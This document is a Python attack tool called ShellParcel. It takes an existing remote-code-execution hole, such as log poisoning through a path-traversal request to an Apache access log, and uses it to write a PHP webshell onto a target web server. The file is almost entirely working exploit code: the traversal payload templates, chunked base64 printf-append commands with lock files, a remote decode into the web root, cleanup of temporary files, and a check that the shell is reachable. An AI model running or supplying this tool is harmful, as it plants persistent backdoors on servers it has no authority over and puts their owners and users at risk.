#!/usr/bin/env python3
"""
ShellParcel - Idempotent Chunked Webshell Deployer
A file-transfer utility that retrieves file contents through an existing webshell/RCE.
Bypasses HTTP 414 URI Too Long and multi-spawn race conditions.
"""

import argparse
import sys
import os
import time
import base64
import urllib.parse
import requests

try:
    import pyfiglet
    from colorama import Fore, Style, init
except ImportError:
    print("Missing dependencies. Install them using: pip install pyfiglet colorama requests")
    sys.exit(1)

init(autoreset=True)

BANNER = pyfiglet.figlet_format("ShellParcel", font="slant")
CREDIT = "Made By Aryan Giri | giriaryan694-a11y"

def print_banner():
    print(Fore.CYAN + BANNER)
    print(Fore.YELLOW + Style.BRIGHT + CREDIT.center(80) + "\n")

def get_interactive_input(prompt, default):
    val = input(f"{Fore.CYAN}{prompt} {Fore.YELLOW}[{default}]{Fore.WHITE}: ").strip()
    return val if val else default

def send_cmd(url, wsp, cmd):
    encoded_cmd = urllib.parse.quote(cmd, safe='')
    exploit_url = f"{url}{wsp.replace('$SP$', encoded_cmd)}"
    try:
        requests.get(exploit_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        return True
    except Exception as e:
        print(f"\n{Fore.RED}[-] Failed to send command: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="ShellParcel: An idempotent, chunked file transfer utility for deploying webshells via RCE (e.g., Log Poisoning). Bypasses URI length limits and race conditions.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""Examples:
  Interactive mode (no arguments):
    python3 shellparcel.py

  CLI mode:
    python3 shellparcel.py -url http://10.10.77.157/ -wsp "?view=dog/../../../../../../var/log/apache2/access.log&ext&c=$SP$" -tp /var/www/html/ -tf ary_webshell.php

  Custom chunk size and encoding:
    python3 shellparcel.py -url http://target.com/ -wsp "?cmd=$SP$" -tp /var/www/html/ -tf shell.php -cs 250 -enc base64

Why use ShellParcel?
  - Bypasses HTTP 414 (URI Too Long) by chunking the payload into safe sizes.
  - Uses idempotent locking (marker files) to prevent file corruption from multi-spawn race conditions in log poisoning.
  - Requires zero outbound egress from the target (no wget/curl needed on the victim).
"""
    )

    parser.add_argument("-url", "--url", help="Target URL (e.g., http://10.10.77.157/)")
    parser.add_argument("-wsp", "--wsp", help="Webshell parameter template. Use $SP$ as the injection point (e.g., ?view=dog/../../../access.log&ext&c=$SP$)")
    parser.add_argument("-tp", "--tp", help="Target web path where the file will be written (e.g., /var/www/html/)")
    parser.add_argument("-tf", "--tf", help="Local target file to upload (e.g., ary_webshell.php)")
    parser.add_argument("-cs", "--chunk-size", type=int, default=500, help="Chunk size in characters (default: 500)")
    parser.add_argument("-enc", "--encoding", default="base64", help="Encoding method (default: base64)")

    print_banner()

    if len(sys.argv) == 1:
        print(f"{Fore.GREEN}[*] No arguments provided. Entering Interactive Mode...\n")
        url = get_interactive_input("Target URL", "http://10.10.77.157/")
        wsp = get_interactive_input("Webshell Parameter Template", "?view=dog/../../../../../../var/log/apache2/access.log&ext&c=$SP$")
        tp = get_interactive_input("Target Web Path", "/var/www/html/")
        tf = get_interactive_input("Local File to Upload", "ary_webshell.php")
        chunk_size = int(get_interactive_input("Chunk Size", "500"))
        encoding = get_interactive_input("Encoding", "base64")
    else:
        args = parser.parse_args()
        url = args.url
        wsp = args.wsp
        tp = args.tp
        tf = args.tf
        chunk_size = args.chunk_size
        encoding = args.encoding

        if not all([url, wsp, tp, tf]):
            print(f"{Fore.RED}[-] Missing required arguments in CLI mode. Use --help for usage.")
            sys.exit(1)

    if "$SP$" not in wsp:
        print(f"{Fore.RED}[-] Webshell Parameter Template (-wsp) must contain '$SP$' as the injection point.")
        sys.exit(1)

    # Normalize paths
    url = url.rstrip('/')
    if not wsp.startswith('?') and not wsp.startswith('/'):
        wsp = '/' + wsp
    
    remote_filename = os.path.basename(tf)
    remote_path = tp.rstrip('/') + '/' + remote_filename
    temp_b64_file = f"/tmp/.sp_{remote_filename}.b64"

    if not os.path.exists(tf):
        print(f"{Fore.RED}[-] Local file '{tf}' not found.")
        sys.exit(1)

    with open(tf, "rb") as f:
        file_content = f.read()

    if encoding.lower() == 'base64':
        payload = base64.b64encode(file_content).decode()
        decode_cmd = f"base64 -d {temp_b64_file} > {remote_path}"
    else:
        print(f"{Fore.RED}[-] Unsupported encoding: {encoding}. Currently only 'base64' is supported.")
        sys.exit(1)

    print(f"{Fore.GREEN}[+] Read {len(file_content)} bytes from '{tf}'")
    print(f"{Fore.GREEN}[+] Encoded payload size: {len(payload)} chars")

    # Step 0: Cleanup
    print(f"{Fore.YELLOW}[*] Clearing temp files and locks on target...")
    send_cmd(url, wsp, f"rm -f {temp_b64_file} /tmp/.sp_done_{remote_filename} /tmp/.sp_lock_{remote_filename}_*")
    time.sleep(1.5)

    # Step 1: Chunking
    chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
    total_chunks = len(chunks)
    print(f"{Fore.YELLOW}[*] Splitting into {total_chunks} chunks of {chunk_size} chars...")

    for i, chunk in enumerate(chunks):
        redirector = ">" if i == 0 else ">>"
        lock_file = f"/tmp/.sp_lock_{remote_filename}_{i}"
        
        cmd = f"[ -f {lock_file} ] || ( touch {lock_file}; printf '%s' '{chunk}' {redirector} {temp_b64_file} )"
        
        print(f"{Fore.CYAN}    -> Sending chunk {i+1}/{total_chunks}...{Style.RESET_ALL}", end="\r")
        if not send_cmd(url, wsp, cmd):
            print(f"\n{Fore.RED}[-] Failed at chunk {i+1}")
            sys.exit(1)
        
        time.sleep(0.5)

    print(f"\n{Fore.GREEN}[+] All {total_chunks} chunks uploaded.                    ")

    # Step 2: Decode
    print(f"{Fore.YELLOW}[*] Decoding payload to {remote_path}...")
    done_lock = f"/tmp/.sp_done_{remote_filename}"
    decode_cmd_full = f"[ -f {done_lock} ] || ( touch {done_lock}; {decode_cmd}; rm -f {temp_b64_file} /tmp/.sp_lock_{remote_filename}_* )"

    if not send_cmd(url, wsp, decode_cmd_full):
        print(f"{Fore.RED}[-] Failed to send decode command.")
        sys.exit(1)
        
    time.sleep(1.5)

    # Step 3: Verify
    verify_url = f"{url}/{remote_filename}"
    print(f"{Fore.YELLOW}[*] Verifying webshell at {verify_url} ...")
    try:
        verify_resp = requests.get(verify_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
        if verify_resp.status_code == 200:
            print(f"{Fore.GREEN}[+] SUCCESS! Webshell deployed. Status: {verify_resp.status_code}")
            print(f"    URL: {verify_url}")
        elif verify_resp.status_code == 403:
            print(f"{Fore.YELLOW}[!] Webshell exists but is forbidden (check permissions). Status: {verify_resp.status_code}")
        else:
            print(f"{Fore.RED}[-] Verification failed. Status: {verify_resp.status_code}")
    except Exception as e:
        print(f"{Fore.RED}[-] Verification error: {e}")

if __name__ == "__main__":
    main()
